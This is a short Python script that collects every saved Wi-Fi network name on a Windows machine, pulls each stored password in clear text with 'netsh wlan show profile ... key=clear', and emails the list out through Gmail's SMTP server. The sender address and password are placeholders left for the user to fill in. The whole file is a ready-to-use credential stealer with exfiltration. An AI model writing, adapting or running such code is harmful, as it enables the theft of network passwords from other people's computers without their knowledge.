import subprocess, smtplib, re

#turn on less secure apps in your email to make this work
def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email, message)
    server.quit()

#function to search network names present
def network_search():
    network_search_op = subprocess.check_output("netsh wlan show profile", shell=True)
    #re.findall finds all instances of expression instead of the only 1st
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", network_search_op)
    return network_names_list

#function to search the password with network names
def pass_search(network_names):
    pass_list = []
    for network in network_names:
        pass_cmd_op = subprocess.check_output("netsh wlan show profile \"" + network + "\" key=clear" ,shell=True)
        pass_search = re.search("(?:Key Content\s*:\s)(.*)", pass_cmd_op).group(1)
        pass_list.append(pass_search)
    return pass_list

#function to send the result as list on email
def send_result(names,pwds):
    dev_list= []
    result_list = []
    for name, pwd in zip(names, pwds):
        dev_dict = {"dev_name":name, "dev_pass": pwd}
        dev_list.append(dev_dict)
    for dev in dev_list:
        current_list = ( dev["dev_name"]+" "+ dev["dev_pass"])
        result_list.append(current_list)
    return result_list
      



net_names_list = network_search()
pass_list = pass_search(net_names_list)
result = send_result(net_names_list, pass_list)

#replace email and password with correct ones
send_email("email@email.com", "password", str(result))